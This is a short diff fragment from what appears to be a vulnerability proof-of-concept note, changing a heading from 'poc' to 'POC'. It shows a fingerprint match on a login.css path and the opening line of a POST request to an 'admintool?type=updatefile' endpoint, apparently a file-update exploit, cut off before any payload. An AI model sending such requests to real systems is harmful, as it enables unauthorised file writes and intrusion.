@@ -6,7 +6,7 @@
 body="/Content/Theme/Standard/webSite/login.css"
 ```
 
-## poc
+## POC
 ```
 POST /Scripts/admintool?type=updatefile HTTP/1.1
 Host: 
